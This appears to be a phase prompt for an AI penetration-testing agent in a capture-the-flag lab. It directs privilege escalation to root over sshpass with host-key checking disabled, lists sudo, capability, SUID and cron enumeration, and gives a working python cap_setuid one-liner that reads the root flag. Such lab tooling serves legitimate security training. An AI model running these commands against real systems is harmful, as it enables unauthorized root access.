## Phase 3: Privilege Escalation

Escalate to root. ALL commands must be run on the TARGET via sshpass — check the attack graph for credentials.

### Command Template
Every command: `sshpass -p 'PASSWORD' ssh -o StrictHostKeyChecking=no USER@TARGET 'COMMAND'`

### Priority Order (fastest first)
1. `sudo -l` — check sudo permissions
2. `getcap -r / 2>/dev/null` — check Linux capabilities (cap_setuid = instant root)
3. SUID binaries: `find / -perm -4000 -type f 2>/dev/null`
4. Cron jobs: `cat /etc/crontab; ls -la /etc/cron.d/`
5. LinPEAS only if above checks find nothing

Use `query_kb` to look up GTFOBins techniques for any interesting binary you find.

### Exploiting Capabilities
If you find `cap_setuid` on python:
```
sshpass -p 'PASS' ssh -o StrictHostKeyChecking=no USER@TARGET '/usr/bin/python3 -c "import os; os.setuid(0); os.system(\"id; cat /root/root.txt\")"'
```

### After Getting Root
- Run `id` to confirm root
- Read root flag: `cat /root/root.txt`
- Call `append_report` with the full attack chain
- Call `transition_phase` with `next_phase: "complete"`

### IMPORTANT
When you have root and the root flag, call transition_phase with next_phase="complete" immediately. Do not continue scanning.
